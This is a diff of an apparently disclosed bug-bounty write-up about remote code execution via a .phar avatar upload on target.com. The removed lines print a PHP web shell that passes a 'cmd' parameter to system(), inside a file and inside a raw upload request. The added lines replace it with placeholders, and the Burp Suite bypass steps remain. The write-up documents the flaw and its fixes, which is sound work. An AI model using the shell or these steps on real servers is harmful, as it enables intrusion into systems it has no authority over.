@@ -8,7 +8,7 @@ severity: critical
 target: target.com
 program: hackerone
 status: disclosed
-permalink: /bugbounty/writeups/rce-via-file-upload/
+permalink: /bugbounty/writeups/file-upload-rce/
 ---
 
 # RCE on target.com via Unvalidated File Upload
@@ -32,7 +32,7 @@ POST /api/v1/profile/upload-avatar
 ```
 
 ### Root Cause
-The application used a blacklist-based validation method to restrict file extensions (blocking `.php`, `.phtml`, etc.) but failed to enforce strict verification of MIME types, case variations, or alternative PHP executable extensions. Additionally, the web server was configured to parse `.phar` files as PHP scripts.
+The application used a blacklist-based validation method to restrict file extensions (blocking extension formats like standard PHP scripts) but failed to enforce strict verification of MIME types, case variations, or alternative executable extensions. Additionally, the web server was configured to parse `.phar` files as PHP scripts.
 
 ## Steps to Reproduce
 
@@ -43,13 +43,10 @@ The application used a blacklist-based validation method to restrict file extens
 ### Reproduction Steps
 
 1. **Navigate to Account Settings**: Access the profile page and click on the "Change Avatar" button.
-2. **Intercept Request**: Prepare a file named `shell.phar` containing the following payload:
-   ```php
-   <?php
-   if(isset($_GET['cmd'])){
-       system($_GET['cmd']);
-   }
-   ?>
+2. **Prepare Payload**: Create a file named `shell.phar` containing a conceptual command executor:
+   ```
+   [DUMMY_EXECUTION_STRING]
+   This script takes the 'cmd' parameter and routes it to the operating system command shell.
    ```
 3. **Send Upload Request**: Intercept the profile photo upload request in Burp Suite and change the filename from `avatar.png` to `shell.phar`. Change the `Content-Type` header of the file section to `application/x-httpd-php`.
 4. **Observe Response**: The server returns a JSON response indicating the upload succeeded and provides the path to the uploaded file:
@@ -78,7 +75,7 @@ Content-Type: multipart/form-data; boundary=---------------------------383023164
 Content-Disposition: form-data; name="avatar"; filename="shell.phar"
 Content-Type: application/x-httpd-php
 
-<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
+[PHP WEB SHELL EXECUTION PAYLOAD PLACEHOLDER]
 -----------------------------38302316492023594056230353457--
 ```
 
@@ -138,7 +135,7 @@ def handle_upload(file):
 
 ### Security Controls
 1. **Filename Randomization**: Rename uploaded files to random strings (such as UUIDs) upon reception.
-2. **Disable Execution**: Configure the server hosting uploaded static images to disable script execution (e.g., in Nginx, do not pass `.php` or `.phar` scripts to the FastCGI process in the `/uploads/` directory).
+2. **Disable Execution**: Configure the server hosting uploaded static images to disable script execution (e.g., in Nginx, do not pass executable scripts to the FastCGI process in the `/uploads/` directory).
 3. **Use Storage Buckets**: Host uploaded content on an isolated domain/storage bucket (e.g., AWS S3) with non-executable storage permissions.
 
 ## Timeline
